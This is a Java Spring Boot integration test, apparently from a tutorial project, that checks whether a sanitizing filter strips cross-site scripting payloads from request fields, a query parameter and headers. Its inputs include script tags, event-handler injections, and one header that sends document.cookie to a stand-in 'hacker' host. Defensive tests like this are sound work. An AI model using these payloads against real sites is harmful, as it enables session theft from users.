package com.baeldung.xss;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.JsonNodeFactory;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.web.server.LocalServerPort;
import org.springframework.http.*;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.util.UriComponentsBuilder;
import java.io.IOException;
import static org.assertj.core.api.Assertions.assertThat;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class PersonControllerIntegrationTest {

    @LocalServerPort
    int randomServerPort;

    @Test
    public void givenRequestIsSuspicious_whenRequestIsPost_thenResponseIsClean()
        throws IOException {
        // given
        String createPersonUrl;
        RestTemplate restTemplate;
        HttpHeaders headers;
        UriComponentsBuilder builder;
        ObjectMapper objectMapper = new ObjectMapper();
        ObjectNode personJsonObject = JsonNodeFactory.instance.objectNode();
        createPersonUrl = "http://localhost:" + randomServerPort + "/personService/person";
        restTemplate = new RestTemplate();
        headers = new HttpHeaders();

        // when
        personJsonObject.put("id", 1);
        personJsonObject.put("firstName", "baeldung <script>alert('XSS')</script>");
        personJsonObject.put("lastName", "baeldung <b onmouseover=alert('XSS')>click me!</b>");

        builder = UriComponentsBuilder.fromHttpUrl(createPersonUrl)
            .queryParam("param", "<script>");

        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.add("header_1", "<body onload=alert('XSS')>");
        headers.add("header_2", "<span onmousemove='doBadXss()'>");
        headers.add("header_3", "<SCRIPT>var+img=new+Image();img.src=\"http://hacker/\"%20+%20document.cookie;</SCRIPT>");
        headers.add("header_4", "<p>Your search for 'flowers <script>evil_script()</script>'");
        HttpEntity<String> request = new HttpEntity<>(personJsonObject.toString(), headers);

        ResponseEntity<String> personResultAsJsonStr = restTemplate.exchange(builder.toUriString(),
            HttpMethod.POST, request, String.class);
        JsonNode root = objectMapper.readTree(personResultAsJsonStr.getBody());

        // then
        assertThat(root.get("firstName").textValue()).isEqualTo("baeldung ");
        assertThat(root.get("lastName").textValue()).isEqualTo("baeldung click me!");
        assertThat(root.get("param").textValue()).isEmpty();
        assertThat(root.get("header_1").textValue()).isEmpty();
        assertThat(root.get("header_2").textValue()).isEmpty();
        assertThat(root.get("header_3").textValue()).isEmpty();
        assertThat(root.get("header_4").textValue()).isEqualTo("Your search for 'flowers '");
    }
}
